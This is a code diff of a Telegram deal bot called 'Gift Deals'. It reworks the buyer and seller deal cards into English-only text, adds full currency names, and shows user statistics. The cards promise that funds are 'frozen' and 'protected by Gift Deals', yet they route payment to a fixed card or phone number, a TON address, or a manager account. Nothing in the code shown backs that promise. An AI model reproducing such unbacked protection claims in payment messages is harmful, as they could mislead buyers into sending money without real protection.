@@ -993,38 +993,53 @@ def build_buyer_card(deal_id, d, seller_tag, lang="ru"):
     item = build_item_line(dtype, d.get("data",{}), lang)
     item_str = f"\n{item.strip()}" if item.strip() else ""
     ru = lang == "ru"
-    # Try to get seller stats from DB
+    CUR_FULL = {
+        "TON": "Toncoin (TON)", "USDT": "Tether (USDT)",
+        "Stars": "Telegram Stars ⭐", "RUB": "Russian Ruble (RUB)",
+        "KZT": "Kazakhstani Tenge (KZT)", "AZN": "Azerbaijani Manat (AZN)",
+        "KGS": "Kyrgyzstani Som (KGS)", "UZS": "Uzbekistani Sum (UZS)",
+        "TJS": "Tajikistani Somoni (TJS)", "BYN": "Belarusian Ruble (BYN)",
+        "UAH": "Ukrainian Hryvnia (UAH)", "GEL": "Georgian Lari (GEL)",
+    }
+    cur_full = CUR_FULL.get(cur, cur)
     try:
         db = load_db()
         seller_uid = d.get("user_id")
         s_data = db["users"].get(seller_uid, {}) if seller_uid else {}
         s_deals = s_data.get("success_deals", 0)
+        s_turnover = s_data.get("turnover", 0)
         s_reviews = s_data.get("reviews", [])
         s_status = s_data.get("status", "")
-        s_status_line = f"\n{'Статус' if ru else 'Status'}: <b>{s_status}</b>" if s_status else ""
-        stats_line = f"\n{'Сделок' if ru else 'Deals'}: <b>{s_deals}</b> | {'Отзывов' if ru else 'Reviews'}: <b>{len(s_reviews)}</b>"
+        s_rep = s_data.get("reputation", 0)
+        s_status_line = f"\n{ce('5438496463044752972','⭐️')} <b>{s_status}</b>" if s_status else ""
+        s_reviews_text = ("\n\n" + "\n".join(f"  • {r}" for r in s_reviews[-3:])) if s_reviews else ""
+        stats_block = (
+            f"{ce('5199552030615558774','👤')} <b>Seller</b>\n"
+            f"<blockquote>"
+            f"<b>{seller_tag}</b>{s_status_line}\n"
+            f"{ce('5274055917766202507','✅')} Deals: <b>{s_deals}</b>\n"
+            f"{ce('5278467510604160626','💰')} Turnover: <b>{s_turnover}</b>\n"
+            f"{ce('5463289097336405244','⭐️')} Rep: <b>{s_rep}</b>\n"
+            f"{ce('5303138782004924588','💬')} Reviews: <b>{len(s_reviews)}</b>{s_reviews_text}"
+            f"</blockquote>\n\n"
+        )
     except:
-        s_status_line = ""; stats_line = ""
+        stats_block = f"{ce('5199552030615558774','👤')} <b>Seller</b>\n<blockquote><b>{seller_tag}</b></blockquote>\n\n"
     return (
-        f"<tg-emoji emoji-id='5445221832074483553'>💼</tg-emoji> <b>{'Сделка' if ru else 'Deal'} #{deal_id}</b>\n\n"
-        f"<blockquote>"
-        f"{'Продавец' if ru else 'Seller'}: <b>{seller_tag}</b>{s_status_line}\n"
-        f"{stats_line}\n"
-        f"{'Покупатель' if ru else 'Buyer'}: <b>{'Вы' if ru else 'You'}</b>\n"
-        f"{'Тип' if ru else 'Type'}: <b>{tname(dtype, lang)}</b>"
-        f"{item_str}\n"
-        f"{'Сумма' if ru else 'Amount'}: <b>{amt} {cur_native(cur)}</b>"
-        f"</blockquote>\n\n"
-        f"{E['security_e']} <b>{'Гарантия безопасности' if ru else 'Security guarantee'}</b>\n"
-        f"<blockquote><b>{'Средства заморожены до подтверждения передачи. Сделка защищена платформой Gift Deals.' if ru else 'Funds are frozen until the transfer is confirmed. The deal is protected by Gift Deals.'}</b></blockquote>\n\n"
-        f"{E['warning']} <b>{'Важно' if ru else 'Important'}:</b>\n"
-        f"<blockquote><b>{'Не передавайте товар напрямую! Только через менеджера @GiftDealsManager.' if ru else 'Do not transfer goods directly! Only through @GiftDealsManager.'}</b></blockquote>\n\n"
-        f"{E['requisites']} <b>{'СБП / Карта' if ru else 'SBP / Card'} {CARD_BANK}:</b>\n"
-        f"<blockquote><b>{'Телефон' if ru else 'Phone'}: <code>{CARD_NUMBER}</code>\n{'Получатель' if ru else 'Recipient'}: {CARD_NAME}\n{'Банк' if ru else 'Bank'}: {CARD_BANK}</b></blockquote>\n\n"
+        f"{E['deal']} <b>Deal #{deal_id}</b>\n\n"
+        f"<b>Type:</b> {tname(dtype, 'en')}{item_str}\n"
+        f"<b>Amount:</b> {amt} {cur_full}\n\n"
+        f"{stats_block}"
+        f"{E['security_e']} <b>Security guarantee</b>\n"
+        f"<blockquote><b>Funds are frozen until the transfer is confirmed. The deal is protected by Gift Deals.</b></blockquote>\n\n"
+        f"{E['warning']} <b>Important:</b>\n"
+        f"<blockquote><b>Do not transfer goods directly! Only through @GiftDealsManager.</b></blockquote>\n\n"
+        f"{E['requisites']} <b>SBP / Card {CARD_BANK}:</b>\n"
+        f"<blockquote><b>Phone: <code>{CARD_NUMBER}</code>\nRecipient: {CARD_NAME}\nBank: {CARD_BANK}</b></blockquote>\n\n"
         f"{E['tonkeeper']} <b>TON / USDT:</b>\n"
-        f"<blockquote><b>{'TON адрес' if ru else 'TON address'}:\n<code>{CRYPTO_ADDRESS}</code>\n\n{E['cryptobot']} {'Крипто бот' if ru else 'Crypto bot'}: {CRYPTO_BOT}</b></blockquote>\n\n"
-        f"⭐ <b>{'Звёзды / NFT' if ru else 'Stars / NFT'}:</b>\n"
-        f"<blockquote><b>{'Отправьте звёзды менеджеру' if ru else 'Send stars to manager'}: @GiftDealsManager</b></blockquote>\n\n"
+        f"<blockquote><b>TON address:\n<code>{CRYPTO_ADDRESS}</code>\n\n{E['cryptobot']} Crypto bot: {CRYPTO_BOT}</b></blockquote>\n\n"
+        f"⭐ <b>Stars / NFT:</b>\n"
+        f"<blockquote><b>Send stars to manager: @GiftDealsManager</b></blockquote>\n\n"
         f"<tg-emoji emoji-id='5206607081334906820'>✅</tg-emoji> {'После перевода нажмите «Я оплатил»' if ru else 'After payment press «I paid»'}"
     )
 
@@ -1036,6 +1051,17 @@ async def send_deal_card(update, context, deal_id, d, buyer=False):
         lang = get_lang(update.effective_user.id); ru = lang == "ru"
         item = build_item_line(dtype, d.get("data",{}), lang)
         item_str = f"\n{item.strip()}" if item.strip() else ""
+
+        # Currency full name mapping
+        CUR_FULL = {
+            "TON": "Toncoin (TON)", "USDT": "Tether (USDT)",
+            "Stars": "Telegram Stars ⭐", "RUB": "Russian Ruble (RUB)",
+            "KZT": "Kazakhstani Tenge (KZT)", "AZN": "Azerbaijani Manat (AZN)",
+            "KGS": "Kyrgyzstani Som (KGS)", "UZS": "Uzbekistani Sum (UZS)",
+            "TJS": "Tajikistani Somoni (TJS)", "BYN": "Belarusian Ruble (BYN)",
+            "UAH": "Ukrainian Hryvnia (UAH)", "GEL": "Georgian Lari (GEL)",
+        }
+        cur_full = CUR_FULL.get(cur, cur)
 
         if buyer:
             pu = f"https://t.me/{partner.lstrip('@')}" if partner.startswith("@") else f"https://t.me/{MANAGER_USERNAME.lstrip('@')}"
@@ -1064,38 +1090,38 @@ async def send_deal_card(update, context, deal_id, d, buyer=False):
             b_reviews_text = ("\n\n" + "\n".join(f"  • {r}" for r in b_reviews[-3:])) if b_reviews else ""
 
             text = (
-                f"{E['deal']} <b>{'Сделка' if ru else 'Deal'} #{deal_id}</b>\n\n"
-                f"<b>{'Тип' if ru else 'Type'}:</b> {tname(dtype, lang)}{item_str}\n"
-                f"<b>{'Сумма' if ru else 'Amount'}:</b> {amt} {cur_native(cur)}\n\n"
+                f"{E['deal']} <b>Deal #{deal_id}</b>\n\n"
+                f"<b>Type:</b> {tname(dtype, 'en')}{item_str}\n"
+                f"<b>Amount:</b> {amt} {cur_full}\n\n"
 
-                f"{ce('5199552030615558774','👤')} <b>{'Продавец' if ru else 'Seller'}</b>\n"
+                f"{ce('5199552030615558774','👤')} <b>Seller</b>\n"
                 f"<blockquote>"
                 f"<b>{seller_display}</b>{s_status_line}\n"
-                f"{ce('5274055917766202507','✅')} {'Сделок' if ru else 'Deals'}: <b>{s_deals}</b>\n"
-                f"{ce('5278467510604160626','💰')} {'Оборот' if ru else 'Turnover'}: <b>{s_turnover} RUB</b>\n"
-                f"{ce('5463289097336405244','⭐️')} {'Репутация' if ru else 'Rep'}: <b>{s_rep}</b>\n"
-                f"{ce('5303138782004924588','💬')} {'Отзывов' if ru else 'Reviews'}: <b>{len(s_reviews)}</b>{s_reviews_text}"
+                f"{ce('5274055917766202507','✅')} Deals: <b>{s_deals}</b>\n"
+                f"{ce('5278467510604160626','💰')} Turnover: <b>{s_turnover}</b>\n"
+                f"{ce('5463289097336405244','⭐️')} Rep: <b>{s_rep}</b>\n"
+                f"{ce('5303138782004924588','💬')} Reviews: <b>{len(s_reviews)}</b>{s_reviews_text}"
                 f"</blockquote>\n\n"
 
-                f"{ce('5199552030615558774','👤')} <b>{'Покупатель' if ru else 'Buyer'}</b>\n"
+                f"{ce('5199552030615558774','👤')} <b>Buyer</b>\n"
                 f"<blockquote>"
                 f"<b>{buyer_display}</b>\n"
-                f"{ce('5274055917766202507','✅')} {'Сделок' if ru else 'Deals'}: <b>{b_deals}</b>\n"
-                f"{ce('5278467510604160626','💰')} {'Оборот' if ru else 'Turnover'}: <b>{b_turnover} RUB</b>\n"
-                f"{ce('5463289097336405244','⭐️')} {'Репутация' if ru else 'Rep'}: <b>{b_rep}</b>\n"
-                f"{ce('5303138782004924588','💬')} {'Отзывов' if ru else 'Reviews'}: <b>{len(b_reviews)}</b>{b_reviews_text}"
+                f"{ce('5274055917766202507','✅')} Deals: <b>{b_deals}</b>\n"
+                f"{ce('5278467510604160626','💰')} Turnover: <b>{b_turnover}</b>\n"
+                f"{ce('5463289097336405244','⭐️')} Rep: <b>{b_rep}</b>\n"
+                f"{ce('5303138782004924588','💬')} Reviews: <b>{len(b_reviews)}</b>{b_reviews_text}"
                 f"</blockquote>\n\n"
 
-                f"{E['security_e']} <b>{'Гарантия безопасности' if ru else 'Security guarantee'}</b>\n"
-                f"<blockquote><b>{'Средства заморожены до подтверждения передачи. Сделка защищена платформой Gift Deals.' if ru else 'Funds are frozen until the transfer is confirmed. The deal is protected by Gift Deals.'}</b></blockquote>\n\n"
-                f"{E['warning']} <b>{'Важно' if ru else 'Important'}:</b>\n"
-                f"<blockquote><b>{'Не передавайте товар напрямую! Только через менеджера @GiftDealsManager.' if ru else 'Do not transfer goods directly! Only through @GiftDealsManager.'}</b></blockquote>\n\n"
-                f"{E['requisites']} <b>{'СБП / Карта' if ru else 'SBP / Card'} {CARD_BANK}:</b>\n"
-                f"<blockquote><b>{'Телефон' if ru else 'Phone'}: <code>{CARD_NUMBER}</code>\n{'Получатель' if ru else 'Recipient'}: {CARD_NAME}\n{'Банк' if ru else 'Bank'}: {CARD_BANK}</b></blockquote>\n\n"
+                f"{E['security_e']} <b>Security guarantee</b>\n"
+                f"<blockquote><b>Funds are frozen until the transfer is confirmed. The deal is protected by Gift Deals.</b></blockquote>\n\n"
+                f"{E['warning']} <b>Important:</b>\n"
+                f"<blockquote><b>Do not transfer goods directly! Only through @GiftDealsManager.</b></blockquote>\n\n"
+                f"{E['requisites']} <b>SBP / Card {CARD_BANK}:</b>\n"
+                f"<blockquote><b>Phone: <code>{CARD_NUMBER}</code>\nRecipient: {CARD_NAME}\nBank: {CARD_BANK}</b></blockquote>\n\n"
                 f"{E['tonkeeper']} <b>TON / USDT:</b>\n"
-                f"<blockquote><b>{'TON адрес' if ru else 'TON address'}:\n<code>{CRYPTO_ADDRESS}</code>\n\n{E['cryptobot']} {'Крипто бот' if ru else 'Crypto bot'}: {CRYPTO_BOT}</b></blockquote>\n\n"
-                f"⭐ <b>{'Звёзды / NFT' if ru else 'Stars / NFT'}:</b>\n"
-                f"<blockquote><b>{'Отправьте звёзды менеджеру' if ru else 'Send stars to manager'}: @GiftDealsManager</b></blockquote>\n\n"
+                f"<blockquote><b>TON address:\n<code>{CRYPTO_ADDRESS}</code>\n\n{E['cryptobot']} Crypto bot: {CRYPTO_BOT}</b></blockquote>\n\n"
+                f"⭐ <b>Stars / NFT:</b>\n"
+                f"<blockquote><b>Send stars to manager: @GiftDealsManager</b></blockquote>\n\n"
                 f"<tg-emoji emoji-id='5206607081334906820'>✅</tg-emoji> {'После перевода нажмите «Я оплатил»' if ru else 'After payment press «I paid»'}"
             )
             kb = InlineKeyboardMarkup([
@@ -1118,7 +1144,7 @@ async def send_deal_card(update, context, deal_id, d, buyer=False):
             s_status_line = f"\n{ce('5438496463044752972','⭐️')} <b>{s_status}</b>" if s_status else ""
             s_reviews_text = ("\n\n" + "\n".join(f"  • {r}" for r in s_reviews[-3:])) if s_reviews else ""
 
-            # Buyer info — get from DB by username, or show partner tag
+            # Buyer info from DB
             buyer_pname = partner.lstrip("@").lower() if partner.startswith("@") else ""
             buyer_uid_str = next((k for k,v in db.get("users",{}).items()
                 if v.get("username","").lower() == buyer_pname), None) if buyer_pname else None
@@ -1130,29 +1156,29 @@ async def send_deal_card(update, context, deal_id, d, buyer=False):
             b_reviews_text = ("\n\n" + "\n".join(f"  • {r}" for r in b_reviews[-3:])) if b_reviews else ""
 
             text = (
-                f"<tg-emoji emoji-id='5206607081334906820'>✅</tg-emoji> <b>{'Сделка создана' if ru else 'Deal created'} #{deal_id}</b>\n\n"
-                f"<b>{'Тип' if ru else 'Type'}:</b> {tname(dtype, lang)}{item_str}\n"
-                f"<b>{'Сумма' if ru else 'Amount'}:</b> {amt} {cur_native(cur)}\n\n"
+                f"<tg-emoji emoji-id='5206607081334906820'>✅</tg-emoji> <b>Deal created #{deal_id}</b>\n\n"
+                f"<b>Type:</b> {tname(dtype, 'en')}{item_str}\n"
+                f"<b>Amount:</b> {amt} {cur_full}\n\n"
 
-                f"{ce('5199552030615558774','👤')} <b>{'Продавец' if ru else 'Seller'}</b>\n"
+                f"{ce('5199552030615558774','👤')} <b>Seller</b>\n"
                 f"<blockquote>"
                 f"<b>{seller_display}</b>{s_status_line}\n"
-                f"{ce('5274055917766202507','✅')} {'Сделок' if ru else 'Deals'}: <b>{s_deals}</b>\n"
-                f"{ce('5278467510604160626','💰')} {'Оборот' if ru else 'Turnover'}: <b>{s_turnover} RUB</b>\n"
-                f"{ce('5463289097336405244','⭐️')} {'Репутация' if ru else 'Rep'}: <b>{s_rep}</b>\n"
-                f"{ce('5303138782004924588','💬')} {'Отзывов' if ru else 'Reviews'}: <b>{len(s_reviews)}</b>{s_reviews_text}"
+                f"{ce('5274055917766202507','✅')} Deals: <b>{s_deals}</b>\n"
+                f"{ce('5278467510604160626','💰')} Turnover: <b>{s_turnover}</b>\n"
+                f"{ce('5463289097336405244','⭐️')} Rep: <b>{s_rep}</b>\n"
+                f"{ce('5303138782004924588','💬')} Reviews: <b>{len(s_reviews)}</b>{s_reviews_text}"
                 f"</blockquote>\n\n"
 
-                f"{ce('5199552030615558774','👤')} <b>{'Покупатель' if ru else 'Buyer'}</b>\n"
+                f"{ce('5199552030615558774','👤')} <b>Buyer</b>\n"
                 f"<blockquote>"
                 f"<b>{partner}</b>\n"
-                f"{ce('5274055917766202507','✅')} {'Сделок' if ru else 'Deals'}: <b>{b_deals}</b>\n"
-                f"{ce('5278467510604160626','💰')} {'Оборот' if ru else 'Turnover'}: <b>{b_turnover} RUB</b>\n"
-                f"{ce('5463289097336405244','⭐️')} {'Репутация' if ru else 'Rep'}: <b>{b_rep}</b>\n"
-                f"{ce('5303138782004924588','💬')} {'Отзывов' if ru else 'Reviews'}: <b>{len(b_reviews)}</b>{b_reviews_text}"
+                f"{ce('5274055917766202507','✅')} Deals: <b>{b_deals}</b>\n"
+                f"{ce('5278467510604160626','💰')} Turnover: <b>{b_turnover}</b>\n"
+                f"{ce('5463289097336405244','⭐️')} Rep: <b>{b_rep}</b>\n"
+                f"{ce('5303138782004924588','💬')} Reviews: <b>{len(b_reviews)}</b>{b_reviews_text}"
                 f"</blockquote>\n\n"
 
-                f"{E['deal_link']} {'Ссылка для покупателя' if ru else 'Link for buyer'}:\n"
+                f"{E['deal_link']} Link for buyer:\n"
                 f"<code>https://t.me/{BOT_USERNAME}?start=deal_{deal_id}</code>\n\n"
                 f"{'Отправьте ссылку партнёру.' if ru else 'Send the link to your partner.'}"
             )
